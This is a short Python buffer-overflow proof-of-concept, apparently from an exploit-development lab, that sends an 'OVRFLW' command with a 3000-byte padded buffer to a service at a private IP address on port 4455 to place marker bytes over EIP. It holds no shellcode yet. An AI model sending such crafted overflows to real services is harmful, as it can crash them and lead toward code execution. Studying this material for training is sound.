#!/usr/bin/python    
import socket
import time
import sys
cmd = "OVRFLW "
end = "\r\n"
filler = "A" * 1241
eip = "B" * 4
overflow  = "C" * 32
inputBuffer = filler + eip + overflow
immunityBuffer = "D" * (3000 - len(filler) - len(eip) - len(overflow))
inputBuffer = filler + eip + overflow + immunityBuffer
buffer = cmd + inputBuffer + end
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.21.111", 4455)) 
s.send(buffer)
resp = s.recv(1024)
print(resp)
s.close()

